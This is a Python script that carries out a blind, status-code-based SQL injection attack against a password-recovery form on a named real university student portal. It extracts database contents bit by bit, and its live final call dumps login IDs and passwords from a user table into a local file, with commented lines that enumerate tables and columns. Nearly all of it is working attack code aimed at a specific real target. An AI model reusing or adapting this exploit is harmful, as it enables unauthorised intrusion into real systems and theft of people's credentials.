#codeName: rough.py
#Author: Dahir Muhammad Dahir
#Date: 22nd-March-2018
#About: script for exploiting Content Based sql injection not really organized just
#       set of functions to get the job done

import os
import requests
from bs4 import BeautifulSoup as bs
from time import time


headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) \
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"}

thisDir = os.getcwd()

#the function retrieve the value of a builtin function
def getQueryString(query):
    fullString = ""
    currentBinaryNum = ""
    length = getLength(query)
    for x in range(length):
        count = x+1
        for i in range(8, -1, -1):
            curNum = 2**i
            mainQuery = """' AND if(ascii(substr((%s), %d,1))&%d=%d, 1, (select table_name from information_schema.tables)) AND '1'='1"""%(query, count, curNum, curNum)
            val = queryDB(mainQuery)
            currentBinaryNum += val
        string = chr(int(currentBinaryNum, 2))
        fullString += string
        currentBinaryNum = ""
    data = "Retrieved Value ===> %s"%(fullString)
    writeData(data)
    print(data)

def getRowContent(tableName, columnName="*", condition=""):
    fullString = ""
    currentBinaryNum = ""
    count = getRowCount(tableName, condition)
    for x in range(count):
        x += 1
        query = "select %s from %s%s limit %d, 1"%(columnName, tableName, condition, x)
        length = getLength("%s"%query)
        for i in range(length):
            i += 1
            for j in range(8, -1, -1):
                curNum = 2**j
                mainQuery = """' AND if(ascii(substr((%s), %d,1))&%d=%d, 1, (select table_name from information_schema.tables)) AND '1'='1"""%(query, i, curNum, curNum)
                val = queryDB(mainQuery)
                currentBinaryNum += val
            string = chr(int(currentBinaryNum, 2))
            fullString += string
            currentBinaryNum = ""
        data = "Retrieved Value for %s ===> %s"%(tableName, fullString)
        writeData(data)
        print(data)
        fullString = ""


#this function will be used to find length of any sql builtin function when necessary
def getLength(query):
    retrievedNum = ""
    for i in range(12, -1, -1):
        curNum = 2**i
        mainQuery = """' AND if(length((%s))&%d=%d, 1, (select table_name from information_schema.tables)) AND '1'='1"""%(query, curNum, curNum)
        val = queryDB(mainQuery)
        retrievedNum += val
    number = int(retrievedNum, 2)
    print("length ===> %d"%number)
    return number


def getRowCount(tableName, condition=""):
    retrievedNum = ""
    for i in range(12, -1, -1):
        curNum = 2 ** i
        mainQuery = """' AND if((select count(*) from %s%s)&%d=%d, 1, (select table_name from information_schema.tables)) AND '1'='1"""%(tableName, condition, curNum, curNum)
        val = queryDB(mainQuery)
        retrievedNum += val
    number = int(retrievedNum, 2)
    data = "count ===> %d"%number
    writeData(data)
    print(data)
    return number



def queryDB(mainQuery):
    data = {"regno":mainQuery, "submit":"Submit"}
    with requests.Session() as s:
        page = s.post("https://student.auk.edu.ng/recover_password.php", data=data, headers=headers)
        if page.status_code == 200:
            return "1"
        elif page.status_code == 500:
            return "0"
        else:
            print("check the query something might be wrong, different status_code received")

def writeData(data):
    with open(thisDir+"/db_dump.dmd", "a") as f:
        f.write(data+"\n")


getRowContent("alqalam_eforms.tblusers_login", columnName="concat(loginid,':',loginpassword)", condition="")
#getRowContent("information_schema.tables", columnName="table_name", condition=" where table_schema='alqalam_eforms'")
#getRowContent("information_schema.columns", columnName="column_name", condition=" where table_name='tblusers_login'")
